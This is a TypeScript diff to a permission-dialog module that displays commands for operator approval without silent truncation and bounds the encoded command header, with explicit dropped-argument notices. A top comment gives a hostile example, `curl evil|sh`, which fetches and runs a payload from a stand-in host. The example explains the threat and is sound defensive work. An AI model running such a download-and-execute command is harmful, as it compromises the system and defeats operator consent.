@@ -1,10 +1,20 @@
 // ---------------------------------------------------------------------------
 // Summarize a command for display in the permission dialog.
 //
-// Goals:
-//   - Always show the binary name so users know what they're approving
-//   - Truncate long commands to keep the dialog readable
-//   - Redact values that look like credentials or secrets
+// Two representations, deliberately kept separate:
+//
+//   summarizeCommand() — a one-line, 80-char summary. Truncating is fine here
+//     because this feeds logs and the PAM grant justification, never a consent
+//     decision.
+//
+//   describeCommand() — the full argv, one element per line, for the operator
+//     to read before approving. This one must never elide silently: an
+//     operator who cannot see the whole command cannot meaningfully consent to
+//     it, and a truncated tail is exactly where a hostile caller would hide
+//     `--command=curl evil|sh`. The caps below exist only to bound dialog size,
+//     and each one states in the rendered output that it fired.
+//
+// Both redact values that look like credentials or secrets.
 // ---------------------------------------------------------------------------
 
 import { basename } from "node:path";
@@ -12,6 +22,18 @@ import { stripControlChars } from "./sanitize.ts";
 
 /** Maximum length for the full summarized command string. */
 const MAX_SUMMARY_LENGTH = 80;
+
+/**
+ * Maximum number of argv elements retained for display and audit. Beyond this
+ * the description states how many were dropped.
+ */
+export const MAX_COMMAND_ARGS = 512;
+
+/** Maximum characters retained per argv element before an explicit marker. */
+export const MAX_ARG_DISPLAY_CHARS = 2000;
+
+/** Maximum characters across all retained elements before an explicit marker. */
+export const MAX_TOTAL_DISPLAY_CHARS = 32_768;
 
 /**
  * Patterns that suggest an argument value is a secret.
@@ -67,8 +89,153 @@ export function summarizeCommand(command: string[]): string | undefined {
   return `${full.slice(0, MAX_SUMMARY_LENGTH - 1)}\u2026`;
 }
 
+/** A command rendered for operator review before an approval decision. */
+export interface CommandDisplay {
+  /**
+   * Redacted argv with `argv[0]` reduced to its basename. Capped per
+   * {@link MAX_COMMAND_ARGS} / {@link MAX_ARG_DISPLAY_CHARS} /
+   * {@link MAX_TOTAL_DISPLAY_CHARS}; {@link capped} says whether that happened.
+   */
+  argv: string[];
+  /**
+   * Display lines: one numbered line per retained argv element, followed by an
+   * explicit notice line if any cap fired. Never contains a silent elision.
+   */
+  lines: string[];
+  /** One-line summary, as {@link summarizeCommand}. For logs and justifications. */
+  summary: string;
+  /** Number of arguments the caller reported, before any cap. */
+  totalArgs: number;
+  /** True if any cap fired. Always accompanied by a notice line in {@link lines}. */
+  capped: boolean;
+}
+
+/** Clamp a single argument, stating the number of characters withheld. */
+function clampArg(value: string): { text: string; clamped: boolean } {
+  if (value.length <= MAX_ARG_DISPLAY_CHARS) return { text: value, clamped: false };
+  const withheld = value.length - MAX_ARG_DISPLAY_CHARS;
+  return { text: `${value.slice(0, MAX_ARG_DISPLAY_CHARS)} …(+${withheld} chars)`, clamped: true };
+}
+
+/**
+ * Describe a command in full for an approval dialog.
+ *
+ * Unlike {@link summarizeCommand} this never elides silently: every retained
+ * argument appears on its own numbered line, and if a cap fires the output says
+ * so and how much it withheld. An operator can therefore trust that what they
+ * see is either the whole command or an explicit statement that it isn't.
+ *
+ * Returns `undefined` if the input is empty.
+ */
+export function describeCommand(command: string[]): CommandDisplay | undefined {
+  const summary = summarizeCommand(command);
+  if (summary === undefined) return undefined;
+
+  const argv: string[] = [];
+  let capped = false;
+  let remaining = MAX_TOTAL_DISPLAY_CHARS;
+  let stoppedOn: "args" | "chars" | undefined;
+
+  for (const [index, raw] of command.entries()) {
+    if (index >= MAX_COMMAND_ARGS) {
+      stoppedOn = "args";
+      break;
+    }
+
+    // Strip control characters per element, not on a joined string: an
+    // embedded newline must not be able to forge a line in the numbered list.
+    const value = stripControlChars(index === 0 ? basename(raw) : redactArg(raw));
+    const { text, clamped } = clampArg(value);
+    if (clamped) capped = true;
+
+    if (text.length > remaining) {
+      stoppedOn = "chars";
+      break;
+    }
+
+    remaining -= text.length;
+    argv.push(text);
+  }
+
+  const width = String(argv.length).length;
+  const lines = argv.map((text, i) => `  ${String(i + 1).padStart(width)}  ${text}`);
+
+  if (stoppedOn !== undefined) {
+    capped = true;
+    const omitted = command.length - argv.length;
+    const reason =
+      stoppedOn === "args"
+        ? `argument limit ${MAX_COMMAND_ARGS}`
+        : `${MAX_TOTAL_DISPLAY_CHARS}-character display limit`;
+    lines.push(`  … ${omitted} further argument(s) not shown (${reason})`);
+  }
+
+  return { argv, lines, summary, totalArgs: command.length, capped };
+}
+
+/**
+ * Byte budget for the encoded `X-Wrapped-Command` header.
+ *
+ * Well under the gate's HTTP server header limit (measured: Bun answers 431
+ * somewhere above 16 KiB), because both failure modes past that limit are
+ * unacceptable. A 431 fails the whole prod request; worse, Bun's *client*
+ * silently omits a sufficiently large header rather than erroring, which would
+ * present the operator with an unlabelled "grant prod access?" dialog — a
+ * blind approval, the precise thing this module exists to prevent.
+ */
+export const MAX_COMMAND_HEADER_BYTES = 8192;
+
+/**
+ * Encode an argv for the `X-Wrapped-Command` header, bounded so it can never
+ * be dropped or rejected in transit.
+ *
+ * When the command does not fit, trailing arguments are replaced by a marker
+ * element that states how many were dropped, so the operator sees a claim
+ * about what is missing rather than a silently shorter command.
+ *
+ * Returns `undefined` for an empty command.
+ */
+export function encodeCommandHeader(command: string[]): string | undefined {
+  if (command.length === 0) return undefined;
+
+  const encoder = new TextEncoder();
+  const full = JSON.stringify(command);
+  if (encoder.encode(full).length <= MAX_COMMAND_HEADER_BYTES) return full;
+
+  // Leave room for the marker element the trimmed encoding always carries.
+  const budget = MAX_COMMAND_HEADER_BYTES - 160;
+  const kept: string[] = [];
+  let bytes = 2; // the enclosing []
+
+  for (const arg of command) {
+    if (kept.length >= MAX_COMMAND_ARGS) break;
+    const cost = encoder.encode(JSON.stringify(arg)).length + (kept.length > 0 ? 1 : 0);
+    if (bytes + cost > budget) break;
+    bytes += cost;
+    kept.push(arg);
+  }
+
+  // A single argument larger than the whole budget would otherwise leave us
+  // sending nothing but the marker; keep a clamped argv[0] so the operator at
+  // least sees what binary is being run.
+  if (kept.length === 0) {
+    kept.push(command[0]!.slice(0, 200));
+  }
+
+  const omitted = command.length - kept.length;
+  kept.push(`… ${omitted} further argument(s) omitted by the client (header size limit)`);
+  return JSON.stringify(kept);
+}
+
 /**
  * Parse the `X-Wrapped-Command` header value into a command array.
+ *
+ * Imposes no length bound of its own: {@link encodeCommandHeader} bounds the
+ * header at the sending end, where the count of what was dropped is still
+ * known and can be stated. Dropping the header here would instead silently
+ * show the operator "no command reported" — the exact failure mode this module
+ * exists to prevent. Display bounds live in {@link describeCommand}, where
+ * they can likewise be stated.
  *
  * Returns `undefined` if the header is missing, empty, or invalid JSON.
  */
